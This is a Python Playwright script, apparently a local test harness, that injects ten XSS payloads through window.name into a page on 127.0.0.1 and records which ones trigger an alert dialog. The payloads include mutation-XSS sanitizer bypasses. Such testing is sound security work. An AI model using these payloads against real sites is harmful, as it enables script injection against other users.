import asyncio
from playwright.async_api import async_playwright

payloads = [
    "<img src=x onerror=alert('XSS')>",
    "<style><style /><img src=x onerror=alert('XSS')>",
    '<img alt="<x" title="/><img src=x onerror=alert(\'XSS\')>">',
    "<option><style></option></select><img src=x onerror=alert('XSS')></style>",
    "<svg/onload=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<input autofocus onfocus=alert('XSS')>",
    '<iframe src="javascript:alert(`XSS`)"></iframe>',
    "<math><mi//xlink:href='data:x,alert(1)'></math>",
    "<select><option></option></select><img src=x onerror=alert('XSS')>"
]

async def test_payload(playwright, file_path: str, payload: str) -> bool:
    browser = await playwright.chromium.launch(headless=True)
    context = await browser.new_context()

    async def on_dialog(dialog):
        print(f"[!] Alert triggered: {dialog.message}")
        await dialog.dismiss()
        context.alert_triggered = True

    page = await context.new_page()
    context.alert_triggered = False
    page.on("dialog", on_dialog)

    # 載入 HTML，設 window.name，再重載頁面觸發
    await page.goto(file_path, wait_until="load")
    await page.evaluate(f'window.name = `{payload}`')
    await page.reload()
    await asyncio.sleep(1)

    await browser.close()
    return context.alert_triggered

async def main():
    html_path = "http://127.0.0.1:5500/test/test.html"  # ← 請改成實際路徑

    async with async_playwright() as playwright:
        print("=== 開始測試 Payloads ===")
        for i, payload in enumerate(payloads):
            try:
                result = await test_payload(playwright, html_path, payload)
                status = "Triggered" if result else "Not Triggered"
                print(f"[{i+1}] {status} | {payload}")
            except Exception as e:
                print(f"[{i+1}] Error: {e} | Payload: {payload}")

if __name__ == "__main__":
    asyncio.run(main())
